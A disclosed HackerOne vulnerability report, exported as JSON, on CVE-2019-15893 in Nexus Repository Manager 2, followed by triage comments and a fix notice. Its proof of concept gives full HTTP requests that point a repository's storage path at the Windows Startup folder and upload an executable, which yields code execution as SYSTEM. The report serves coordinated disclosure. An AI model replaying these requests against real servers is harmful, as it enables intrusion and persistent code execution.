{"id":683965,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82ODM5NjU=","url":"https://hackerone.com/reports/683965","title":"Unrestricted File Upload Leading to Remote Code Execution","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-08-28T18:42:12.237Z","submitted_at":"2019-08-28T18:42:12.237Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hland","url":"/hland","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/043/303/e1c7388bb5caea88c569aeeeb069571590c50037_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":35524,"url":"https://hackerone.com/central-security-project","handle":"central-security-project","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Central Security Project","twitter_handle":"SaferOpenSource","website":"https://www.sonatype.com/central-security-project","about":"Ensuring Safer Open Source Across Ecosystems"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-15893"],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-30T20:05:22.210Z","bug_reporter_agreed_on_going_public_at":"2019-10-30T20:05:22.148Z","team_member_agreed_on_going_public_at":"2019-10-28T18:58:23.805Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Description\nAs an administrator user it is possible to create files and directories in any location on the file system of the server. This can be abused to write files to any sensitive location on the Windows file system because the Nexus process runs with SYSTEM privileges. This can allows an attacker that is able to break into the Nexus Repository Manager to elevate privileges to SYSTEM on the server and use it as pivoting point for lateral movement during an attack.\n\nIn the proof-of-concept I upload a PE executable file to the user's Windows Startup Folder, achieving remote code execution the next time the user logs in. In my example simply executing calc.exe. \n\nThe tests were done with an installation of Nexus Repository Manager OSS 2.14.9-01 on Microsoft Windows Server 2016 Datacenter 10.0.14393 N/A Build 1439.\n\n### Additional Details\nUnfortunately I was unable to dig up the functions handling these HTTP requests.\n\n## Steps to reproduce:\n1. Create a repo and set the \"overrideLocalStorageUrl\" to a folder two levels below the one you want to write files to.\n\n`POST /nexus/service/local/repositories`\n\n2. Upload a file to a directory of your choice by manipulating the \"g\", \"a\" and \"v\" parameters\n\n`POST /nexus/service/local/artifact/maven/content`\n\n\n### Proof-Of-Concept\n\n1. Create repository:\n\n```\nPOST /nexus/service/local/repositories HTTP/1.1\nHost: nexus-host\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json\nX-Nexus-UI: true\nContent-Length: 443\nConnection: close\nCookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770\n\n{\"data\":{\"repoType\":\"hosted\",\"id\":\"5000\",\"name\":\"MyTestRepo\",\"writePolicy\":\"ALLOW_WRITE_ONCE\",\"browseable\":true,\"indexable\":true,\"exposed\":true,\"notFoundCacheTTL\":1440,\"repoPolicy\":\"RELEASE\",\"provider\":\"maven2\",\"providerRole\":\"org.sonatype.nexus.proxy.repository.Repository\",\"overrideLocalStorageUrl\":\"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu\",\"downloadRemoteIndexes\":false,\"checksumPolicy\":\"IGNORE\"}}\n\nHTTP/1.1 201 Created\nDate: Wed, 28 Aug 2019 16:58:53 GMT\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nServer: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8\nContent-Type: application/json; charset=UTF-8\nContent-Length: 638\nConnection: close\n\n{\"data\":{\"contentResourceURI\":\"http://\u003credacted\u003e/nexus/content/repositories/5000\",\"id\":\"5000\",\"name\":\"MyTestRepo\",\"provider\":\"maven2\",\"providerRole\":\"org.sonatype.nexus.proxy.repository.Repository\",\"format\":\"maven2\",\"repoType\":\"hosted\",\"exposed\":true,\"writePolicy\":\"ALLOW_WRITE_ONCE\",\"browseable\":true,\"indexable\":true,\"notFoundCacheTTL\":1440,\"repoPolicy\":\"RELEASE\",\"downloadRemoteIndexes\":false,\"overrideLocalStorageUrl\":\"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu\",\"defaultLocalStorageUrl\":\"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000\"}}\n```\n\n2. Upload file\n\n```\nPOST /nexus/service/local/artifact/maven/content HTTP/1.1\nHost: nexus-host\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269\nContent-Length: 33250\nConnection: close\nCookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770\nUpgrade-Insecure-Requests: 1\n\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"r\"\n\n5000\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"g\"\n\nPrograms\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"a\"\n\nStartup\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"v\"\n\n.\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"p\"\n\njar\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"c\"\n\n\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"e\"\n\nexe\n-----------------------------103850373015325909411337083269\nContent-Disposition: form-data; name=\"file\"; filename=\"calc.exe\"\nContent-Type: text/html\n\n\u003cinsert_content_of_calc.exe\u003e\n-----------------------------103850373015325909411337083269--\n\n\nHTTP/1.1 201 Created\nDate: Wed, 28 Aug 2019 17:05:47 GMT\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nServer: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8\nContent-Type: text/html;charset=UTF-8\nContent-Length: 77\nConnection: close\n\n{\"groupId\":\"Programs\",\"artifactId\":\"Startup\",\"version\":\".\",\"packaging\":\"jar\"}\n```\n\n## Patch\nThere are multiple ways to fix this:\n\n1. Make it the default to run Nexus Repository Manager as a less privileged user. \n2. Restrict the locations on the filesystem that Nexus Repository Manager can write to.\n\n## Additional details\n\n* OS Name:                   Microsoft Windows Server 2016 Datacenter\n* OS Version:                10.0.14393 N/A Build 14393\n\n* java version \"1.8.0_211\"\nJava(TM) SE Runtime Environment (build 1.8.0_211-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)\n\n# Wrap up\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\nMy reaction when uploading files to any location on the filesystem:\nhttps://66.media.tumblr.com/463873f43d1b6c3ae34ab817fe92e0a2/tumblr_inline_omgbhw31qa1qar3or_500.gif\n\n## Impact\n\nThe attacker could run arbitrary code on the server as the SYSTEM user.","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-27T18:58:23.872Z","allow_singular_disclosure_after":-59084342.00552394,"singular_disclosure_allowed":true,"vote_count":9,"voters":["spam404","dhakal_ananda","realtess","powerjacobb1","dolph1n","sun-tzu","1_demotemp","hakerlearner101","jonnygill"],"severity":{"rating":"critical","score":9.1,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":17122,"asset_type":"SOURCE_CODE","asset_identifier":"Java Component in search.maven.org","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5685670,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Adding screenshots of attack. ","automated_response":false,"created_at":"2019-08-28T18:55:54.810Z","updated_at":"2019-08-28T18:55:54.810Z","actor":{"username":"hland","cleared":false,"url":"/hland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/303/e1c7388bb5caea88c569aeeeb069571590c50037_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":569082,"filename":"4._Calc_spawns_on_restart_and_login.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7833oumzZje4ngy1VZWN34Tq?response-content-disposition=attachment%3B%20filename%3D%224._Calc_spawns_on_restart_and_login.png%22%3B%20filename%2A%3DUTF-8%27%274._Calc_spawns_on_restart_and_login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151725Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9cf4ee416d19662758edef5e588c4c40fde405fc5a0217098d9ef84ca04e2768"},{"id":569081,"filename":"1._Create_repository_with_path_set_to_startup.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/H7VbrsHrKLJmkJngKE9j4yBQ?response-content-disposition=attachment%3B%20filename%3D%221._Create_repository_with_path_set_to_startup.png%22%3B%20filename%2A%3DUTF-8%27%271._Create_repository_with_path_set_to_startup.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151725Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=335334d94a2033a0fde27c286fc923720cedb621c6d1ccc927602b9cf3c14c42"},{"id":569080,"filename":"3._File_uploaded_to_Startup_folder.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3gPpRdWYiPQSu2R12CFcrMWv?response-content-disposition=attachment%3B%20filename%3D%223._File_uploaded_to_Startup_folder.png%22%3B%20filename%2A%3DUTF-8%27%273._File_uploaded_to_Startup_folder.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151725Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ae02c5eed78c03ab7c0e4029f2077d26ba2b196cbc17ed88444d6b47b267a62b"},{"id":569079,"filename":"2._Upload_file_to_Startup_Folder.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hme1dR8vdu2xnqe3NUs7A9Jj?response-content-disposition=attachment%3B%20filename%3D%222._Upload_file_to_Startup_Folder.png%22%3B%20filename%2A%3DUTF-8%27%272._Upload_file_to_Startup_Folder.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151725Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=bfcf3820c7d1a6158f697394b86063221ee6bc0335c95c6fcf62e5871aca1605"}],"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5686641,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hland , thank you for your submission.  We are looking into and confirming the vulnerability now.  We will reply back soon with a confirmation.","automated_response":false,"created_at":"2019-08-28T22:42:36.582Z","updated_at":"2019-08-28T22:42:36.582Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5700842,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2019-08-30T20:03:20.421Z","updated_at":"2019-08-30T20:03:20.421Z","additional_data":{"old_title":"Privilege Escalation / Unrestricted File Upload as SYSTEM","new_title":"Unrestricted File Upload Leading to Remote Code Execution"},"actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5700883,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@hland Thank you again for your submission.  There are two parts to the attack you describe, the file upload leading to Remote Code Execution and the fact that the Windows service runs as SYSTEM leading to Privilege Escalation.  For the former, we consider this a vulnerability and are working on a fix.  For the latter, this is more a case of not adhering to a best practice and is not a vulnerability on its own.  While running as SYSTEM is not considered a vulnerability, we are still investigating on how we can best address this issue.\n\nAlso, how would you like to be credited for the discovery of this vulnerability?","automated_response":false,"created_at":"2019-08-30T20:10:23.501Z","updated_at":"2019-08-30T20:10:23.501Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5704675,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thank you for the fast response. I agree with your assessment. I'm thinking that making it easier to run the software without SYSTEM privileges and being very explicit about the inherent dangers of running as SYSTEM would help.\n\nIf you could credit me using my name and company that would be greatly appreciated :) \nName: Christian Håland\nCompany: Binary Security \nWebsite: https://www.binarysecurity.no","automated_response":false,"created_at":"2019-08-31T13:22:14.713Z","updated_at":"2019-08-31T13:22:14.713Z","actor":{"username":"hland","cleared":false,"url":"/hland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/303/e1c7388bb5caea88c569aeeeb069571590c50037_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5718350,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-09-03T13:51:11.052Z","updated_at":"2019-09-03T13:51:11.052Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5945468,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, just checking in to see if there's any status updates on this issue? Thanks in advance. \n/Christian","automated_response":false,"created_at":"2019-10-02T18:35:39.542Z","updated_at":"2019-10-02T18:35:39.542Z","actor":{"username":"hland","cleared":false,"url":"/hland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/303/e1c7388bb5caea88c569aeeeb069571590c50037_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6154975,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2019-10-28T14:30:02.777Z","updated_at":"2019-10-28T14:30:02.777Z","cve_ids":["CVE-2019-15893"],"actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6155025,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This vulnerability has been fixed and disclosed at https://support.sonatype.com/hc/en-us/articles/360035055794-CVE-2019-15893-Nexus-Repository-Manager-2-Remote-Code-Execution-2019-09-03","automated_response":false,"created_at":"2019-10-28T14:33:50.928Z","updated_at":"2019-10-28T14:33:50.928Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6157209,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2019-10-28T17:57:48.687Z","updated_at":"2019-10-28T17:57:48.687Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"hland","url":"/hland"},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6157689,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi ████████,\n\nAs part of the CVE assignment process, we'd like to publicly disclose this report. Is there any information you'd like us to redact before doing so?\n\nThanks","automated_response":false,"created_at":"2019-10-28T18:58:23.823Z","updated_at":"2019-10-30T10:20:43.572Z","first_to_agree":true,"actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6176272,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-10-30T20:05:22.177Z","updated_at":"2019-10-30T20:05:22.177Z","actor":{"username":"hland","cleared":false,"url":"/hland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/303/e1c7388bb5caea88c569aeeeb069571590c50037_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6176273,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-10-30T20:05:22.232Z","updated_at":"2019-10-30T20:05:22.232Z","actor":{"username":"hland","cleared":false,"url":"/hland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/303/e1c7388bb5caea88c569aeeeb069571590c50037_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":18673,"category":"team","content":"https://support.sonatype.com/hc/en-us/articles/